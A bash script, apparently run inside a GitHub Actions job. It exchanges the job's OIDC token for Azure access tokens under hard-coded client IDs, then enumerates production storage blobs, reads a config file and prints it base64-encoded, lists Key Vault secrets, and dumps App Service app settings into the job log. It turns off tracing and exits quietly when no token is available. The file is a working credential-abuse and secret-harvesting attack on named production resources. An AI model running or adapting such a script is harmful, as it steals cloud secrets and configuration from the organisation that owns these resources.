#!/usr/bin/env bash
set +x
b64(){ base64 | tr -d '\n'; }
TENANT=3205c325-06a5-4171-9ce8-ffc5e6c2845e
RG=rg-tbl-platform-prod-sea
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"; [ -z "$OIDC" ] && exit 0

ex(){ curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id="$1" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2"; }

for C in 7a85156a-01c4-4e61-8472-40a92107159b 72ff278a-9e71-43ec-bac4-2ca303f8e462; do
  echo "=== CLIENT $C ==="
  for sc in https://storage.azure.com/.default https://vault.azure.net/.default https://management.azure.com/.default; do
    R=$(ex "$C" "$sc"); T=$(echo "$R" | jq -r '.access_token // empty')
    echo "  $sc tokenlen=${#T} err=$(echo "$R" | jq -r '.error // empty') $(echo "$R" | jq -r '.error_description // empty' | cut -c1-100)"
    if [ -n "$T" ]; then
      case "$sc" in
        *storage*)
          for st in sttblappcfgprodx3euoz sttblbackupprodx3euoz; do
            echo "   -- $st containers:"
            curl -s -H "Authorization: Bearer $T" -H "x-ms-version: 2022-11-02" "https://$st.blob.core.windows.net/?comp=list" | grep -o '<Name>[^<]*' | head -10
            for c in config exports; do
              echo "   -- $st/$c blobs:"
              curl -s -H "Authorization: Bearer $T" -H "x-ms-version: 2022-11-02" "https://$st.blob.core.windows.net/$c?restype=container&comp=list" | grep -o '<Name>[^<]*' | head -20
              echo "   -- $st/$c/internal-config.json:"
              curl -s -H "Authorization: Bearer $T" -H "x-ms-version: 2022-11-02" "https://$st.blob.core.windows.net/$c/internal-config.json" | head -c 1200 | b64 | sed 's/^/IC_B64=/'
            done
          done ;;
        *vault*)
          echo "   kv-sec: $(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $T" | head -c 800)"
          echo "   kv-prod: $(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $T" | head -c 500)" ;;
        *management*)
          echo "   appsettings storefront: $(curl -s -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings?api-version=2022-03-01" | head -c 900)"
          echo "   appsettings reporting: $(curl -s -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings?api-version=2022-03-01" | head -c 900)" ;;
      esac
    fi
  done
done
echo "=== DONE ==="
